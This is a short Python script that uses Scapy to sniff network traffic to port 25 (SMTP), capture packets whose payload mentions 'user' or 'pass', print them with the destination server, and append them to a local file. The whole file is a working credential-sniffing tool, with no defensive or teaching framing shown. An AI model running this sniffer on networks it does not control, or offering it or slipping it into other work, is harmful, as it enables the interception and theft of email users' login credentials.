from scapy.all import *
import os

def packet_callback(packet):
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            mail_packet = packet[TCP].payload.load.decode('utf-8', 'ignore')
            if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
                print("[*] Server: %s" % packet[IP].dst)
                print("[*] %s" % mail_packet)

                # Save the captured packets to a file in the sniffedpackets directory
                if not os.path.exists("sniffedpackets"):
                    os.makedirs("sniffedpackets")

                filename = "sniffedpackets/packets.txt"
                with open(filename, "a") as f:
                    f.write("[*] Server: %s\n" % packet[IP].dst)
                    f.write("[*] %s\n" % mail_packet)

    except:
        pass

sniff(prn=packet_callback, filter="tcp dst port 25", store=0)
